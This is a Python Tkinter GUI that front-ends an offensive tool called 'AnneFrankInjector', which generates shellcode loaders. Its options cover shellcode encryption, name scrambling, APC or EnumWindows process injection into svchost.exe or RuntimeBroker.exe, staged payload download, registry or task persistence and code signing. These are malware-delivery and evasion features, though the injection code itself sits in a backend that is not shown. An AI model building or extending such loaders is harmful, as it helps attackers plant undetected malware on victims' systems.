#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import platform
import subprocess
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from tkinter.scrolledtext import ScrolledText

class AnneFrankGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("AnneFrankInjector - GUI")
        self.root.geometry("780x880")  # increased height for new controls

        # Determine backend path (absolute)
        script_dir = os.path.dirname(os.path.abspath(__file__))
        if platform.system() == "Windows":
            self.backend = os.path.join(script_dir, "Windows", "main.py")
        else:
            self.backend = os.path.join(script_dir, "Linux", "main.py")

        if not os.path.isfile(self.backend):
            messagebox.showerror("Error", f"Backend not found: {self.backend}")
            sys.exit(1)

        main_frame = ttk.Frame(root, padding=12)
        main_frame.grid(row=0, column=0, sticky="nsew")
        root.columnconfigure(0, weight=1)
        root.rowconfigure(0, weight=1)

        # ---------- Shellcode file ----------
        row = 0
        ttk.Label(main_frame, text="Shellcode file:").grid(row=row, column=0, sticky="w")
        self.shellcode_path = tk.StringVar()
        ttk.Entry(main_frame, textvariable=self.shellcode_path, width=60).grid(row=row, column=1, columnspan=2, sticky="ew")
        ttk.Button(main_frame, text="Browse", command=self.browse_shellcode).grid(row=row, column=3)
        row += 1

        # ---------- Mode ----------
        ttk.Label(main_frame, text="Mode:").grid(row=row, column=0, sticky="w")
        self.mode = tk.StringVar(value="stageless")
        ttk.Radiobutton(main_frame, text="Stageless", variable=self.mode, value="stageless").grid(row=row, column=1, sticky="w")
        ttk.Radiobutton(main_frame, text="Staged", variable=self.mode, value="staged").grid(row=row, column=2, sticky="w")
        row += 1

        # ---------- Staged settings (hidden initially) ----------
        self.staged_frame = ttk.LabelFrame(main_frame, text="Staged Settings")
        self.staged_frame.grid(row=row, column=0, columnspan=4, sticky="ew", pady=6)
        self.staged_frame.grid_remove()
        staged_row = 0
        ttk.Label(self.staged_frame, text="IP:").grid(row=staged_row, column=0, sticky="w")
        self.ip = tk.StringVar()
        ttk.Entry(self.staged_frame, textvariable=self.ip, width=20).grid(row=staged_row, column=1, padx=5)
        staged_row += 1
        ttk.Label(self.staged_frame, text="Port:").grid(row=staged_row, column=0, sticky="w")
        self.port = tk.StringVar()
        ttk.Entry(self.staged_frame, textvariable=self.port, width=10).grid(row=staged_row, column=1, padx=5)
        staged_row += 1
        ttk.Label(self.staged_frame, text="Path:").grid(row=staged_row, column=0, sticky="w")
        self.path = tk.StringVar(value="/")
        ttk.Entry(self.staged_frame, textvariable=self.path, width=30).grid(row=staged_row, column=1, padx=5)
        # increase main row after staged_frame
        row += 1

        # ---------- Common options ----------
        self.encrypt = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="Encrypt shellcode", variable=self.encrypt).grid(row=row, column=0, columnspan=4, sticky="w")
        row += 1

        self.scramble = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="Scramble names", variable=self.scramble).grid(row=row, column=0, columnspan=4, sticky="w")
        row += 1

        # ---------- Format ----------
        ttk.Label(main_frame, text="Format:").grid(row=row, column=0, sticky="w")
        self.format = tk.StringVar(value="EXE")
        ttk.Radiobutton(main_frame, text="EXE", variable=self.format, value="EXE").grid(row=row, column=1, sticky="w")
        ttk.Radiobutton(main_frame, text="DLL", variable=self.format, value="DLL").grid(row=row, column=2, sticky="w")
        row += 1

        # ---------- APC target ----------
        ttk.Label(main_frame, text="APC Target:").grid(row=row, column=0, sticky="w")
        self.apc = tk.StringVar(value="RuntimeBroker.exe")
        ttk.Combobox(main_frame, textvariable=self.apc, values=["RuntimeBroker.exe", "svchost.exe"], width=25).grid(row=row, column=1, sticky="w")
        row += 1

        # ---------- Persistence ----------
        ttk.Label(main_frame, text="Persistence:").grid(row=row, column=0, sticky="w")
        self.persistence = tk.StringVar(value="none")
        ttk.Combobox(main_frame, textvariable=self.persistence, values=["none", "reg", "task"], width=25, state="readonly").grid(row=row, column=1, sticky="w")
        row += 1

        # ---------- Output name ----------
        ttk.Label(main_frame, text="Output name:").grid(row=row, column=0, sticky="w")
        self.output_name = tk.StringVar(value="afloader")
        ttk.Entry(main_frame, textvariable=self.output_name, width=30).grid(row=row, column=1, sticky="w")
        row += 1

        # ---------- Delay & Spawn ----------
        ttk.Label(main_frame, text="Delay (sec):").grid(row=row, column=0, sticky="w")
        self.delay = tk.StringVar(value="0")
        ttk.Entry(main_frame, textvariable=self.delay, width=10).grid(row=row, column=1, sticky="w")
        row += 1

        self.spawn = tk.BooleanVar()
        ttk.Checkbutton(main_frame, text="Spawn process", variable=self.spawn).grid(row=row, column=0, sticky="w")
        self.spawn_path = tk.StringVar(value="C:\\Windows\\System32\\notepad.exe")
        ttk.Label(main_frame, text="Spawn path:").grid(row=row, column=1, sticky="w")
        ttk.Entry(main_frame, textvariable=self.spawn_path, width=40).grid(row=row, column=2, columnspan=2, sticky="ew")
        row += 1

        # ---------- Injection technique (NEW) ----------
        ttk.Label(main_frame, text="Injection technique:").grid(row=row, column=0, sticky="w")
        self.injection = tk.StringVar(value="apc")
        ttk.Combobox(main_frame, textvariable=self.injection, values=["apc", "enumwindows"], width=25, state="readonly").grid(row=row, column=1, sticky="w")
        row += 1

        # ---------- Staggered persistence (NEW) ----------
        self.staggered = tk.BooleanVar()
        ttk.Checkbutton(main_frame, text="Staggered persistence (two-stage)", variable=self.staggered).grid(row=row, column=0, columnspan=4, sticky="w")
        row += 1

        # ---------- Code signing ----------
        signing_frame = ttk.LabelFrame(main_frame, text="Code Signing")
        signing_frame.grid(row=row, column=0, columnspan=4, sticky="ew", pady=8)
        signing_row = 0
        ttk.Label(signing_frame, text="Cert:").grid(row=signing_row, column=0, sticky="w")
        self.cert_source = tk.StringVar(value="none")
        ttk.Combobox(signing_frame, textvariable=self.cert_source, values=["none", "custom"], width=15, state="readonly").grid(row=signing_row, column=1, sticky="w")
        signing_row += 1
        self.pfx_path = tk.StringVar()
        self.pfx_pass = tk.StringVar()
        ttk.Label(signing_frame, text="PFX:").grid(row=signing_row, column=0, sticky="w")
        ttk.Entry(signing_frame, textvariable=self.pfx_path, width=50).grid(row=signing_row, column=1, padx=5)
        ttk.Button(signing_frame, text="Browse", command=self.browse_pfx).grid(row=signing_row, column=2)
        signing_row += 1
        ttk.Label(signing_frame, text="Pass:").grid(row=signing_row, column=0, sticky="w")
        ttk.Entry(signing_frame, textvariable=self.pfx_pass, show="*", width=30).grid(row=signing_row, column=1, sticky="w")
        row += 1

        # ---------- Generate button ----------
        self.gen_button = ttk.Button(main_frame, text="GENERATE LOADER", command=self.generate)
        self.gen_button.grid(row=row, column=0, columnspan=4, pady=15)
        row += 1

        # ---------- Output text area ----------
        ttk.Label(main_frame, text="Output:").grid(row=row, column=0, sticky="w")
        self.output_text = ScrolledText(main_frame, height=18)
        self.output_text.grid(row=row+1, column=0, columnspan=4, sticky="nsew")

        # Configure resizing
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(row+1, weight=1)

        self.mode.trace_add("write", self.toggle_staged)

    def browse_shellcode(self):
        f = filedialog.askopenfilename(filetypes=[("Bin", "*.bin"), ("All", "*.*")])
        if f:
            self.shellcode_path.set(f)

    def browse_pfx(self):
        f = filedialog.askopenfilename(filetypes=[("PFX", "*.pfx")])
        if f:
            self.pfx_path.set(f)

    def toggle_staged(self, *args):
        if self.mode.get() == "staged":
            self.staged_frame.grid()
        else:
            self.staged_frame.grid_remove()

    def generate(self):
        if not self.shellcode_path.get():
            messagebox.showerror("Error", "Select shellcode!")
            return
        self.gen_button.config(state="disabled")
        self.output_text.delete(1.0, tk.END)
        threading.Thread(target=self.run_backend, daemon=True).start()

    def run_backend(self):
        try:
            backend_abs = os.path.abspath(self.backend)
            backend_dir = os.path.dirname(backend_abs)
            backend_script = os.path.basename(backend_abs)

            cmd = [sys.executable, backend_script, self.mode.get(),
                   "-p", self.shellcode_path.get(),
                   "-f", self.format.get(),
                   "-apc", self.apc.get(),
                   "-o", self.output_name.get()]

            if self.encrypt.get():
                cmd.append("-e")
            if self.scramble.get():
                cmd.append("-s")
            if self.persistence.get() != "none":
                cmd.extend(["--persistence", self.persistence.get()])
            if int(self.delay.get()) > 0:
                cmd.extend(["--delay", self.delay.get()])
            if self.spawn.get():
                cmd.append("--spawn")
                cmd.extend(["--spawn-path", self.spawn_path.get()])
            # NEW: injection technique
            if self.injection.get() != "apc":
                cmd.extend(["--injection", self.injection.get()])
            # NEW: staggered persistence
            if self.staggered.get():
                cmd.append("--staggered")

            if self.cert_source.get() != "none" and self.pfx_path.get():
                cmd.extend(["-pfx", self.pfx_path.get()])
                if self.pfx_pass.get():
                    cmd.extend(["-pfx-pass", self.pfx_pass.get()])

            if self.mode.get() == "staged":
                cmd.extend(["-i", self.ip.get(), "-po", self.port.get(), "-pa", self.path.get()])

            self.output_text.insert(tk.END, " ".join(cmd) + "\n" + "="*70 + "\n")
            self.root.update_idletasks()

            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1, cwd=backend_dir)

            for line in proc.stdout:
                self.output_text.insert(tk.END, line)
                self.output_text.see(tk.END)
                self.root.update_idletasks()

            proc.wait()
            if proc.returncode == 0:
                messagebox.showinfo("Success", f"Done → {self.output_name.get()}.{self.format.get().lower()}")
            else:
                messagebox.showerror("Failed", "See output above")
        except Exception as e:
            self.output_text.insert(tk.END, f"ERROR: {e}\n")
            messagebox.showerror("Error", str(e))
        finally:
            self.gen_button.config(state="normal")

if __name__ == "__main__":
    root = tk.Tk()
    app = AnneFrankGUI(root)
    root.mainloop()
